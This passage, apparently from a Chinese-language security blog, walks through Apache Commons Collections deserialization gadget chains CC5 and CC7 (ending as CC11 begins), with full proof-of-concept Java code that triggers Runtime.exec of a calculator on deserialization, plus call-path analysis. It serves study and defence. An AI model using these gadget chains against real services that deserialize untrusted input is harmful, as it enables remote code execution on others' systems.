<p>流程分析：<br>也就是CC4后半条链直接调用了invokertransformer，并且我们需要手动把templates放进add方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671272080045-427fda9e-2c2c-4832-ac1b-aafd318960e4.png#averageHue=%232e2d2c&clientId=ua04e3dd5-9b07-4&from=paste&height=150&id=u51268610&name=image.png&originHeight=187&originWidth=546&originalType=binary&ratio=1&rotation=0&showTitle=false&size=16069&status=done&style=none&taskId=u0596040b-ef60-4ae0-a589-10f07af8b58&title=&width=436.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671272085596-4ba63d27-1098-41a1-8178-ccf7436f2843.png#averageHue=%232d2c2c&clientId=ua04e3dd5-9b07-4&from=paste&height=336&id=u46d6f3b8&name=image.png&originHeight=420&originWidth=896&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33980&status=done&style=none&taskId=u6b94db15-8dc3-4bc3-9271-3c56bf2b71c&title=&width=716.8" alt="image.png"><br>都是传入了一个泛型E e，然后进入了siftUp方法，这个e实际就是传入的templates：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671272111785-2dfe0478-1e0d-4783-ab1e-cddefa2c5709.png#averageHue=%232d2c2c&clientId=ua04e3dd5-9b07-4&from=paste&height=230&id=ua948867d&name=image.png&originHeight=287&originWidth=988&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30472&status=done&style=none&taskId=u7d62e083-c2f3-4627-9111-4a2b93a07fc&title=&width=790.4" alt="image.png"><br>最后调用<code>comparator.compare(x, (E) e)</code>，在这里comparator已经是<code>TransformingComparator</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671272154611-8d86c00e-25de-467d-b3e3-ace503cfd739.png#averageHue=%232d2c2c&clientId=ua04e3dd5-9b07-4&from=paste&height=214&id=ue3c1c555&name=image.png&originHeight=268&originWidth=1025&originalType=binary&ratio=1&rotation=0&showTitle=false&size=42550&status=done&style=none&taskId=u40d5f6c1-7773-4a0a-8518-1c6047692ab&title=&width=820" alt="image.png"><br>transformer就是invokertransformer，然后obj就是上面compare里传入的templates，也就触发了invokertransformer.transform(templates)，命令执行<br>分析完毕<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671272245079-4d252f94-98e3-4b7f-bec1-d8b56a413e4e.png#averageHue=%23f5f5f5&clientId=ua04e3dd5-9b07-4&from=paste&height=646&id=ubbd54532&name=image.png&originHeight=808&originWidth=1525&originalType=binary&ratio=1&rotation=0&showTitle=false&size=144413&status=done&style=none&taskId=uaf75b622-3f37-4d4a-9aa6-93c99319ebe&title=&width=1220" alt="image.png"></p>
<h2 id="1X2-6-CC5"><a href="#1X2-6-CC5" class="headerlink" title="1X2.6 CC5"></a>1X2.6 CC5</h2><p>接下来讲的CC5和CC7其实都是在CC6的基础上修改了一些地方而已<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671339291227-e3332ad6-1353-4563-90c0-b1ab8bb898f3.png#averageHue=%23fefefe&clientId=u41a9af7b-4562-4&from=paste&height=460&id=uffbac7eb&name=image.png&originHeight=575&originWidth=1110&originalType=binary&ratio=1&rotation=0&showTitle=false&size=38751&status=done&style=none&taskId=u8f3b064d-c2e5-49e1-88c7-8e34a478322&title=&width=888" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="number">123</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">poc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(poc,tiedmap);</span><br><span class="line">        <span class="comment">//序列化，反序列化</span></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;./cc5.bin&quot;</span>));</span><br><span class="line">            outputStream.writeObject(poc);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;./cc5.bin&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>怎么说呢，版本就是JDK1.8，然后对于commoncollections版本要求大概就是3.2,3.1这样子（3.2.1和3.1均可）<br>其实也就2个地方不同<code>BadAttributeValueExpException.readObject</code>-&gt;<code>TiedMapEntry.toString()</code>，就前面这2个地方和CC6略微有所不同，后半部分大部分完全一致<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671340865790-12f13f8a-ef02-425a-9761-00ff17293462.png#averageHue=%2364604e&clientId=u41a9af7b-4562-4&from=paste&height=558&id=ue1aa73ad&name=image.png&originHeight=697&originWidth=1919&originalType=binary&ratio=1&rotation=0&showTitle=false&size=164684&status=done&style=none&taskId=u4ff8333c-cb10-4aef-9366-aea37b678b4&title=&width=1535.2" alt="image.png"><br>在<code>BadAttributeValueExpException</code>的readObject中调用了<code>valObj</code>的toString:<br>我们只需要让valObj为TiedMapEntry即可触发<code>TiedMapEntry.toString</code><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671340948955-329a2e33-5736-41a3-a9a0-1ee5620306ec.png#averageHue=%232d2c2b&clientId=u41a9af7b-4562-4&from=paste&height=99&id=u674d8427&name=image.png&originHeight=124&originWidth=1086&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23697&status=done&style=none&taskId=ud2d84476-6686-47fe-8c01-6a62f5b67b8&title=&width=868.8" alt="image.png"><br>这里只需要反射获取val属性，修改为TiedMapEntry即可，之后进入了<code>TiedMapEntry.toString</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671341027134-76c3b292-79df-4cd7-b6b6-4aed1d250ce1.png#averageHue=%232d2d2c&clientId=u41a9af7b-4562-4&from=paste&height=124&id=u82b9b4f6&name=image.png&originHeight=155&originWidth=681&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14228&status=done&style=none&taskId=u2eafd8a8-9fa0-4c35-b06b-c44a0b28d87&title=&width=544.8" alt="image.png"><br>进入getvalue：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671341034194-eac3d537-924a-4b0d-a943-b9c88b8e1b7e.png#averageHue=%232d2d2c&clientId=u41a9af7b-4562-4&from=paste&height=126&id=u8142e036&name=image.png&originHeight=157&originWidth=556&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12901&status=done&style=none&taskId=u61645e0b-f938-4118-8812-f8d1f0c3249&title=&width=444.8" alt="image.png"><br>调用LazyMap.get，接下来一样的流程</p>
<h2 id="1X2-7-CC7"><a href="#1X2-7-CC7" class="headerlink" title="1X2.7 CC7"></a>1X2.7 CC7</h2><p>CC7也大同小异<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671341111021-0cb36023-c2b8-455f-9870-abbf1794c78e.png#averageHue=%23fefefd&clientId=u41a9af7b-4562-4&from=paste&height=323&id=ud688a005&name=image.png&originHeight=404&originWidth=1141&originalType=binary&ratio=1&rotation=0&showTitle=false&size=32960&status=done&style=none&taskId=ua8fbf19c-0f99-46f2-ab41-b5d21829943&title=&width=912.8" alt="image.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.AbstractMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Reusing transformer chain and LazyMap gadgets from previous payloads</span></span><br><span class="line">        <span class="keyword">final</span> String[] execArgs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        execArgs),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">        lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">        lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">        hashtable.put(lazyMap2, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">iTransformers</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        iTransformers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        iTransformers.set(transformerChain,transformers);</span><br><span class="line"><span class="comment">//        Reflections.setFieldValue(transformerChain, &quot;iTransformers&quot;, transformers);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Needed to ensure hash collision after previous manipulations</span></span><br><span class="line">        lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test1.out&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(hashtable);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test1.out&quot;</span>));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"><span class="comment">//            return hashtable;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>也是分析了一会儿，也是前2个地方不同：<br><code>Hashtable.readObject</code>-&gt;<code>Hashtable.reconstitutionPut</code>-&gt;<code>Abstracecorator.equal</code>-&gt;<code>AbstractMap.equals</code>虽然说看起来好像是四个步骤，但是其实equals这里，首先是调用LazyMap.equals，然后Lazymap没有一直找父类找到了<code>AbstractMap.equals</code><br>来分析一下就好了，首先看到readObject：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671343932899-2ffd8721-1452-416e-b208-6e8dce99315c.png#averageHue=%232c2c2c&clientId=ud99e82de-341a-4&from=paste&height=314&id=u18e9570b&name=image.png&originHeight=393&originWidth=895&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49410&status=done&style=none&taskId=u6605a25b-ce95-4f7a-bb3a-14bb4a9d54a&title=&width=716" alt="image.png"><br>在最低下调用了reconstitutionput继续跟进：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671343955529-ccae016a-f8c9-48a1-9e56-2abcfdb7f612.png#averageHue=%232d2c2c&clientId=ud99e82de-341a-4&from=paste&height=322&id=ube1f2f59&name=image.png&originHeight=402&originWidth=821&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62316&status=done&style=none&taskId=u7c3e4ba0-f411-4ee6-b7f9-22ba8d38bda&title=&width=656.8" alt="image.png"><br>调用了e.key.equals，这里就需要整理一下这个key究竟是什么了，我们溯源一下（过程太繁琐就不一步步的说）最终在WriteObject里可以看到：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671344504930-a9b2d1b7-663f-4953-89d2-a75d198af4d0.png#averageHue=%232d2c2b&clientId=ud99e82de-341a-4&from=paste&height=187&id=ufe113a7c&name=image.png&originHeight=234&originWidth=705&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25625&status=done&style=none&taskId=u19774240-9178-4c4a-8919-4f6d4873140&title=&width=564" alt="image.png"><br>其实key就是我们第一次put进去的key，为什么需要put两次呢？<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671344552505-5296eb67-8961-45bf-8b2e-cfcea1e24d8f.png#averageHue=%232d2b2b&clientId=ud99e82de-341a-4&from=paste&height=310&id=u27d378cb&name=image.png&originHeight=388&originWidth=1039&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55743&status=done&style=none&taskId=u63579ce5-0d2c-4cfa-9053-d927d357950&title=&width=831.2" alt="image.png"><br>第一次进入reconstitution时，tab[index]是未赋值的，因此为null，进入不了for循环内，第二次put就可以进入for循环，此时e.key就是LazyMap1，key就是LazyMap2<br>然后就调用<code>lazymap1.equals(lazymap2)</code>，由于lazymap没有equals方法，一直回溯就到了abstractmap.equals:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671344676722-ab9f5bb7-7cb8-411f-88b7-3be3f5a545ea.png#averageHue=%232d2c2c&clientId=ud99e82de-341a-4&from=paste&height=165&id=ub3f8277e&name=image.png&originHeight=206&originWidth=740&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21576&status=done&style=none&taskId=ud5ca4965-d3f2-4c80-966f-396815af808&title=&width=592" alt="image.png"><br>这个m就是lazymap2:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671344694039-8341e281-5f7d-4af3-8256-06a792a087f5.png#averageHue=%232c2b2b&clientId=ud99e82de-341a-4&from=paste&height=196&id=uc69300fc&name=image.png&originHeight=245&originWidth=942&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19770&status=done&style=none&taskId=u916c16fd-215c-46aa-9b01-41be8b72b04&title=&width=753.6" alt="image.png"><br>因此就调用了Lazymap2.get，后半部分就和CC6一样了，没啥好说的</p>
<p>为什么需要remove LazyMap2的yy键呢？<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671344756693-e1f6112a-b3f2-495a-b9fa-e55f8eed6f0e.png#averageHue=%232d2c2b&clientId=ud99e82de-341a-4&from=paste&height=404&id=ue9b47712&name=image.png&originHeight=505&originWidth=890&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69998&status=done&style=none&taskId=ud66e2f53-c96c-4550-90d2-8c6f3e3d438&title=&width=712" alt="image.png"><br>在HashTable的put方法也会调用一次equals! entry就是tab[index]也是第二次put生效，因此，然后和CC6是一个问题，分析一下LazyMap.get:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671344818622-a815a836-e7d0-4b6d-9627-d496e6061768.png#averageHue=%232d2c2b&clientId=ud99e82de-341a-4&from=paste&height=234&id=u818b16c3&name=image.png&originHeight=293&originWidth=868&originalType=binary&ratio=1&rotation=0&showTitle=false&size=33234&status=done&style=none&taskId=u81826d3d-485e-45ad-b485-e902fed8f16&title=&width=694.4" alt="image.png"><br>此时这个key是yy（感兴趣的可以自己去往上追溯，很好分析，算了还是讲一下吧）为什么是yy呢？我们一步步跟进：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671344903306-16e26fe2-86dc-4fa6-be24-338306a6aad4.png#averageHue=%232e2c2b&clientId=ud99e82de-341a-4&from=paste&height=53&id=u2b74a1a3&name=image.png&originHeight=66&originWidth=473&originalType=binary&ratio=1&rotation=0&showTitle=false&size=6772&status=done&style=none&taskId=u56c6cb9e-60b3-43e1-8f49-186db60dbd0&title=&width=378.4" alt="image.png"><br>AbstractMap里的key是什么呢：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671344937491-4cdca472-db6b-40b5-991e-ead6b6e43e27.png#averageHue=%232c2c2b&clientId=ud99e82de-341a-4&from=paste&height=249&id=u789c8d90&name=image.png&originHeight=311&originWidth=983&originalType=binary&ratio=1&rotation=0&showTitle=false&size=35944&status=done&style=none&taskId=u1a0b790e-7a12-4092-ac54-d5d78e86de0&title=&width=786.4" alt="image.png"><br>由于我们是先调用了HashMap里的equals,最后才到的AbstractMap，因此这个entryset也就是HashMap的，LazyMap1里放的就是HashMap1，里面的键是yy，因此为yy<br>说完了为什么是yy后，就继续分析，因为我们的LazyMap2里并没有yy这个键，所以会进入if添加一个yy，所以当反序列化的时候就不会进入if判断了，因此需要remove掉</p>
<p><strong>最后一个疑惑点，为什么是yy和zZ呢？</strong><br>同样的还是 reconstitutionPut 函数里的问题，前面说到我们会 put 两次，那么自然 index 这里计算也会进行两次，那么如果第一次和第二次计算出来的 hash 值不同，那么 index 就会不同，就会导致在第二次中 tab 中会找不到值，从而 e 为 null，自然不会进入 for 循环，就不会触发 RCE<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671345408578-b6a58b47-e443-476a-ad4d-2d0bdaa8ccc2.png#averageHue=%232d2b2b&clientId=ud99e82de-341a-4&from=paste&height=304&id=u09537c65&name=image.png&originHeight=380&originWidth=1260&originalType=binary&ratio=1&rotation=0&showTitle=false&size=51746&status=done&style=none&taskId=u74d02b4e-6310-4df0-99b8-a7475425494&title=&width=1008" alt="image.png"><br>我们需要让程序以为2次put的tab是同一个才能进入这个for循环，进而rce<br>还有就是为什么只有yy和zZ可以相同，这是java的一个小bug，yy和zZ的hashCode值是一样的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671345490688-933ecf7a-e87e-4dff-9dd1-7ed05abb9a0d.png#averageHue=%23333130&clientId=ud99e82de-341a-4&from=paste&height=37&id=u46417658&name=image.png&originHeight=46&originWidth=674&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10706&status=done&style=none&taskId=u6e4a4fa9-0528-4d53-9859-406416cb4ce&title=&width=539.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671345494085-99fac5e3-3d97-4959-bce5-b1bf0b1c90b3.png#averageHue=%23302f2e&clientId=ud99e82de-341a-4&from=paste&height=110&id=udafa83aa&name=image.png&originHeight=137&originWidth=525&originalType=binary&ratio=1&rotation=0&showTitle=false&size=11296&status=done&style=none&taskId=u6fef6d53-0c21-45a7-bd85-2e35426578f&title=&width=420" alt="image.png"><br>分析告一段落拉<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671718037239-5d5ff2a7-bfb0-4c43-b328-b6c276ce45da.png#averageHue=%232b2b2b&clientId=u67d25bb3-559b-4&from=paste&id=u6340100c&name=image.png&originHeight=595&originWidth=2994&originalType=url&ratio=1&rotation=0&showTitle=false&size=114270&status=done&style=none&taskId=ufba244a2-4296-4331-92a5-168dae747b6&title=" alt="image.png"></p>
<h2 id="1X2-8-CC11"><a href="#1X2-8-CC11" class="headerlink" title="1X2.8 CC11"></a>1X2.8 CC11</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span 